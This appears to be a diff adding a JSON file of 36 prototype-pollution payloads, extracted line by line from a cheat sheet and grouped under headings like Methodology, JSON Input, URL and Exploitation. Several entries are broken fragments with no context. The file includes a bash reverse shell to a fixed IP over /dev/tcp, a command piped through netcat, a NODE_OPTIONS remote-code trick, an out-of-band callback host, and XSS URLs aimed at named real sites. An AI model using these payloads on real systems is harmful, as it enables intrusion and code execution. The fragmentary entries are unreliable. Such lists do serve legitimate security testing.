@@ -1,0 +1,326 @@
+[
+  {
+    "id": "prototype-pollution-1",
+    "title": "Methodology",
+    "payload": "myDog.constructor;",
+    "context": "Methodology",
+    "tags": [
+      "prototype-pollution"
+    ]
+  },
+  {
+    "id": "prototype-pollution-2",
+    "title": "Methodology",
+    "payload": "myDog.constructor.prototype;",
+    "context": "Methodology",
+    "tags": [
+      "prototype-pollution"
+    ]
+  },
+  {
+    "id": "prototype-pollution-3",
+    "title": "Methodology",
+    "payload": "myDog.__proto__;",
+    "context": "Methodology",
+    "tags": [
+      "prototype-pollution"
+    ]
+  },
+  {
+    "id": "prototype-pollution-4",
+    "title": "Methodology",
+    "payload": "myDog[\"__proto__\"];",
+    "context": "Methodology",
+    "tags": [
+      "prototype-pollution"
+    ]
+  },
+  {
+    "id": "prototype-pollution-5",
+    "title": "Examples",
+    "payload": "isAdmin: false",
+    "context": "Examples",
+    "tags": [
+      "prototype-pollution"
+    ]
+  },
+  {
+    "id": "prototype-pollution-6",
+    "title": "Examples",
+    "payload": "};",
+    "context": "Examples",
+    "tags": [
+      "prototype-pollution"
+    ]
+  },
+  {
+    "id": "prototype-pollution-7",
+    "title": "Examples",
+    "payload": "Object.prototype.isAdmin = true;",
+    "context": "Examples",
+    "tags": [
+      "prototype-pollution"
+    ]
+  },
+  {
+    "id": "prototype-pollution-8",
+    "title": "Prototype Pollution via JSON Input",
+    "payload": "\"__proto__\": {",
+    "context": "Prototype Pollution via JSON Input",
+    "tags": [
+      "prototype-pollution"
+    ]
+  },
+  {
+    "id": "prototype-pollution-9",
+    "title": "Prototype Pollution via JSON Input",
+    "payload": "\"evilProperty\": \"evilPayload\"",
+    "context": "Prototype Pollution via JSON Input",
+    "tags": [
+      "prototype-pollution"
+    ]
+  },
+  {
+    "id": "prototype-pollution-10",
+    "title": "Prototype Pollution via JSON Input",
+    "payload": "\"argv0\":\"node\",",
+    "context": "Prototype Pollution via JSON Input",
+    "tags": [
+      "prototype-pollution"
+    ]
+  },
+  {
+    "id": "prototype-pollution-11",
+    "title": "Prototype Pollution via JSON Input",
+    "payload": "\"shell\":\"node\",",
+    "context": "Prototype Pollution via JSON Input",
+    "tags": [
+      "prototype-pollution"
+    ]
+  },
+  {
+    "id": "prototype-pollution-12",
+    "title": "Prototype Pollution via JSON Input",
+    "payload": "\"NODE_OPTIONS\":\"--inspect=payload\\\"\\\".oastify\\\"\\\".com\"",
+    "context": "Prototype Pollution via JSON Input",
+    "tags": [
+      "prototype-pollution"
+    ]
+  },
+  {
+    "id": "prototype-pollution-13",
+    "title": "Prototype Pollution via JSON Input",
+    "payload": "\"constructor\": {",
+    "context": "Prototype Pollution via JSON Input",
+    "tags": [
+      "prototype-pollution"
+    ]
+  },
+  {
+    "id": "prototype-pollution-14",
+    "title": "Prototype Pollution via JSON Input",
+    "payload": "\"prototype\": {",
+    "context": "Prototype Pollution via JSON Input",
+    "tags": [
+      "prototype-pollution"
+    ]
+  },
+  {
+    "id": "prototype-pollution-15",
+    "title": "Prototype Pollution via JSON Input",
+    "payload": "\"foo\": \"bar\",",
+    "context": "Prototype Pollution via JSON Input",
+    "tags": [
+      "prototype-pollution"
+    ]
+  },
+  {
+    "id": "prototype-pollution-16",
+    "title": "Prototype Pollution via JSON Input",
+    "payload": "\"json spaces\": 10",
+    "context": "Prototype Pollution via JSON Input",
+    "tags": [
+      "prototype-pollution"
+    ]
+  },
+  {
+    "id": "prototype-pollution-17",
+    "title": "Prototype Pollution in URL",
+    "payload": "https://victim.com/#a=b&__proto__[admin]=1",
+    "context": "Prototype Pollution in URL",
+    "tags": [
+      "prototype-pollution"
+    ]
+  },
+  {
+    "id": "prototype-pollution-18",
+    "title": "Prototype Pollution in URL",
+    "payload": "https://example.com/#__proto__[xxx]=alert(1)",
+    "context": "Prototype Pollution in URL",
+    "tags": [
+      "prototype-pollution"
+    ]
+  },
+  {
+    "id": "prototype-pollution-19",
+    "title": "Prototype Pollution in URL",
+    "payload": "http://server/servicedesk/customer/user/signup?__proto__.preventDefault.__proto__.handleObj.__proto__.delegateTarget=%3Cimg/src/onerror=alert(1)%3E",
+    "context": "Prototype Pollution in URL",
+    "tags": [
+      "prototype-pollution"
+    ]
+  },
+  {
+    "id": "prototype-pollution-20",
+    "title": "Prototype Pollution in URL",
+    "payload": "https://www.apple.com/shop/buy-watch/apple-watch?__proto__[src]=image&__proto__[onerror]=alert(1)",
+    "context": "Prototype Pollution in URL",
+    "tags": [
+      "prototype-pollution"
+    ]
+  },
+  {
+    "id": "prototype-pollution-21",
+    "title": "Prototype Pollution in URL",
+    "payload": "https://www.apple.com/shop/buy-watch/apple-watch?a[constructor][prototype]=image&a[constructor][prototype][onerror]=alert(1)",
+    "context": "Prototype Pollution in URL",
+    "tags": [
+      "prototype-pollution"
+    ]
+  },
+  {
+    "id": "prototype-pollution-22",
+    "title": "Prototype Pollution Exploitation",
+    "payload": ".es(*).props(label.__proto__.env.AAAA='require(\"child_process\").exec(\"bash -i >& /dev/tcp/192.168.0.136/12345 0>&1\");process.exit()//')",
+    "context": "Prototype Pollution Exploitation",
+    "tags": [
+      "prototype-pollution"
+    ]
+  },
+  {
+    "id": "prototype-pollution-23",
+    "title": "Prototype Pollution Exploitation",
+    "payload": ".props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')",
+    "context": "Prototype Pollution Exploitation",
+    "tags": [
+      "prototype-pollution"
+    ]
+  },
+  {
+    "id": "prototype-pollution-24",
+    "title": "Prototype Pollution Exploitation",
+    "payload": "\"client\": 1,",
+    "context": "Prototype Pollution Exploitation",
+    "tags": [
+      "prototype-pollution"
+    ]
+  },
+  {
+    "id": "prototype-pollution-25",
+    "title": "Prototype Pollution Exploitation",
+    "payload": "\"escapeFunction\": \"JSON.stringify; process.mainModule.require('child_process').exec('id | nc localhost 4444')\"",
+    "context": "Prototype Pollution Exploitation",
+    "tags": [
+      "prototype-pollution"
+    ]
+  },
+  {
+    "id": "prototype-pollution-26",
+    "title": "Prototype Pollution Payloads",
+    "payload": "Object.__proto__[\"evilProperty\"]=\"evilPayload\"",
+    "context": "Prototype Pollution Payloads",
+    "tags": [
+      "prototype-pollution"
+    ]
+  },
+  {
+    "id": "prototype-pollution-27",
+    "title": "Prototype Pollution Payloads",
+    "payload": "Object.__proto__.evilProperty=\"evilPayload\"",
+    "context": "Prototype Pollution Payloads",
+    "tags": [
+      "prototype-pollution"
+    ]
+  },
+  {
+    "id": "prototype-pollution-28",
+    "title": "Prototype Pollution Payloads",
+    "payload": "Object.constructor.prototype.evilProperty=\"evilPayload\"",
+    "context": "Prototype Pollution Payloads",
+    "tags": [
+      "prototype-pollution"
+    ]
+  },
+  {
+    "id": "prototype-pollution-29",
+    "title": "Prototype Pollution Payloads",
+    "payload": "Object.constructor[\"prototype\"][\"evilProperty\"]=\"evilPayload\"",
+    "context": "Prototype Pollution Payloads",
+    "tags": [
+      "prototype-pollution"
+    ]
+  },
+  {
+    "id": "prototype-pollution-30",
+    "title": "Prototype Pollution Payloads",
+    "payload": "{\"__proto__\": {\"evilProperty\": \"evilPayload\"}}",
+    "context": "Prototype Pollution Payloads",
+    "tags": [
+      "prototype-pollution"
+    ]
+  },
+  {
+    "id": "prototype-pollution-31",
+    "title": "Prototype Pollution Payloads",
+    "payload": "{\"__proto__.name\":\"test\"}",
+    "context": "Prototype Pollution Payloads",
+    "tags": [
+      "prototype-pollution"
+    ]
+  },
+  {
+    "id": "prototype-pollution-32",
+    "title": "Prototype Pollution Payloads",
+    "payload": "x[__proto__][abaeead] = abaeead",
+    "context": "Prototype Pollution Payloads",
+    "tags": [
+      "prototype-pollution"
+    ]
+  },
+  {
+    "id": "prototype-pollution-33",
+    "title": "Prototype Pollution Payloads",
+    "payload": "x.__proto__.edcbcab = edcbcab",
+    "context": "Prototype Pollution Payloads",
+    "tags": [
+      "prototype-pollution"
+    ]
+  },
+  {
+    "id": "prototype-pollution-34",
+    "title": "Prototype Pollution Payloads",
+    "payload": "__proto__[eedffcb] = eedffcb",
+    "context": "Prototype Pollution Payloads",
+    "tags": [
+      "prototype-pollution"
+    ]
+  },
+  {
+    "id": "prototype-pollution-35",
+    "title": "Prototype Pollution Payloads",
+    "payload": "__proto__.baaebfc = baaebfc",
+    "context": "Prototype Pollution Payloads",
+    "tags": [
+      "prototype-pollution"
+    ]
+  },
+  {
+    "id": "prototype-pollution-36",
+    "title": "Prototype Pollution Payloads",
+    "payload": "?__proto__[test]=test",
+    "context": "Prototype Pollution Payloads",
+    "tags": [
+      "prototype-pollution"
+    ]
+  }
+]
